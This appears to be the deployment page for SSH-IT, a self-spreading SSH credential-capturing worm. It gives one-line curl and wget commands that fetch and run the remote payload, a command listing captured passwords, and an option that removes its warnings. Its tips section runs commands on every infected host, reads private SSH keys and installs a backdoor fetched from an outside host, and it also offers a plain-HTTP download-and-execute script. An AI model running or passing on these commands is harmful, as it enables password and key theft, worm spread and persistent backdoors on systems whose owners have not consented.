---
layout: default
---

Use either one of these commands to deploy:
```shell
bash -c "$(curl -fsSL ssh-it.thc.org/x)"
```
```shell
bash -c "$(wget --no-verbose -O- ssh-it.thc.org/x)"
```

{:refdef: style="text-align: center;"}
![Deploy-Example](deploy-example2.png)
{: refdef}

To show all captured passwords use:
```
~/.prng/thc_ctl -r list
```
{:refdef: style="text-align: center;"}
![Deploy-Example](list-example.png)
{: refdef}


To uninstall use:
```
~/.prng/thc_ctl -r uninstall
```

### ALPHA TESTING

This is ALPHA STAGE. DO NOT SHARE.
If you know about this then consider yourself special. Join us on [Telegram](https://t.me/thcorg).

ALPHA DEFAULT SETTINGS:
* ```THC_VERBOSE=1``` Display a warning when *ssh* is being intercepted (in bold red).
* ```THC_DEPTH=2``` The worm will not spread further than 2 hops away from the current host.
* ```THC_DEBUG=1``` Display debug information.
* ```THC_DEBUG_LOG=thc.log``` Output (most) debug information to ```thc.log```.

{:refdef: style="text-align: center;"}
![Verbose-Example](verbose-example.png)
{: refdef}

Take off all safety and run SSH-IT in release mode (*with no warnings*):
```shell
THC_NO_CONDOME=1 bash -c "$(curl -fsSL ssh-it.thc.org/x)"
```

### Tips & Tricks
#### Remote Command Execution
Executing a command on _all_ hosts
```
~/.prng/thc_cli -r exec 'id'
```

Retrieve the private SSH key (```id_rsa```) from _all_ hosts:
```
~/.prng/thc_cli -r exec 'cat .ssh/id_rsa 2>/dev/null'
```

Install a backdoor on _all_ hosts:
```
~/.prng/thc_cli -r exec 'bash -c "$(curl -fsSL gsocket.io/x)"'
```

#### When HTTPS is not available
Deploy from a self-extracting shell-script [ssh-it-deploy.sh](http://nossl.segfault.net/ssh-it-deploy.sh):
```shell
# Without HTTPS 
wget --no-hsts http://nossl.segfault.net/ssh-it-deploy.sh && \
chmod 755 ssh-it-deploy.sh && \
./ssh-it-deploy.sh
```

Special thanks to BadAdvert1zer for ideas and testing.

### Contact

Twitter: [https://twitter.com/hackerschoice](https://twitter.com/hackerschoice)  
Telegram: [https://t.me/thcorg](https://t.me/thcorg)  
Web: [https://www.thc.org](https://www.thc.org)  
Medium: [https://medium.com/@hackerschoice](https://medium.com/@hackerschoice)  
E-Mail: members@thc.org  


